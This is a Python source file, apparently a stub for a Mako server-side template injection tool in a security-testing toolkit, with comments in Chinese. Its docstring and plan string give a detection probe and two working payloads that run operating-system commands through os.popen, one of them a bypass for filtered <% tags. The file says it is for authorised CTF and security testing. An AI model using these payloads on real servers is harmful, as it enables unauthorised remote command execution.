"""Mako SSTI 利用 —— 占位符(逐引擎实现,本文件待实现)。

实现要点:
指纹: ${7*7}→49。
RCE: <% import os %><% print(os.popen(cmd).read()) %>
<% 被过滤时: ${__import__('os').popen(cmd).read()}。

仅用于授权 CTF / 安全测试环境。
"""
from app.core.registry import register_tool

from tools.web.ssti_base import SstiEngineTool


@register_tool
class SstiMakoTool(SstiEngineTool):
    name = "ssti_mako"
    description = "Mako(Python) SSTI:<% %> 原生 Python 代码块直接 RCE(占位符)"
    engine_key = "mako"
    engine_name = "Mako"
    default_mode = "exec"
    plan = r"""指纹: ${7*7}→49。
RCE: <% import os %><% print(os.popen(cmd).read()) %>
<% 被过滤时: ${__import__('os').popen(cmd).read()}。"""
